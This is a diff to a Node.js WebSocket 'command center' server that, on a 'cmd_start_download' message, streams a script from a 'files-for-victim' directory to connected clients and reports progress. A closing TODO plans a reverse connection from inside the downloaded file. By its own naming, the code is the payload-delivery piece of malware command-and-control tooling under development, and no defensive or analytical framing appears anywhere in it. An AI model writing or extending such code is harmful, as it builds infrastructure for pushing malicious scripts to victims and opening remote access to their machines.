@@ -12,27 +12,33 @@ function decode1(data) {
   return JSON.parse(data);
 }
 
-websocketServer.on("connection", (weboscket) => {
+websocketServer.on("connection", (w) => {
   console.log("client connected");
 
-  weboscket.on("message", (message) => {
+  w.on("message", (message) => {
     if (decode1(message) === "cmd_start_download") {
-      const stream = fs.createReadStream("./files-for-victim/2.js");
+      const filePath = "./files-for-victim/2.js";
+      const fileSize = fs.statSync(filePath).size;
+      w.send(JSON.stringify(fileSize));
+      const stream = fs.createReadStream(filePath);
+      let bytesSent = 0;
       stream.on("data", (data) => {
-        weboscket.send(data);
+        bytesSent += data.length;
+        const p = ((bytesSent / fileSize) * 100).toFixed(2);
+        w.send(data);
+        w.send(JSON.stringify({ p: p }));
       });
       stream.on("end", () => {
-        weboscket.send("fileEnd");
+        w.send(JSON.stringify({ p: 100 }));
+        w.close();
       });
       stream.on("error", (error) => {
-        console.error("Error reading file:", error);
-        weboscket.send("fileError");
+        w.close();
       });
     }
     console.log("msg:", decode1(message));
   });
-
-  weboscket.on("close", () => {
+  w.on("close", () => {
     console.log("client disconnected");
   });
 });
@@ -40,3 +46,5 @@ websocketServer.on("connection", (weboscket) => {
 server.listen(PORT, () => {
   console.log(`command center running on port ${PORT}`);
 });
+
+// TODO: Create new reverse connection from whithin the downloaded file
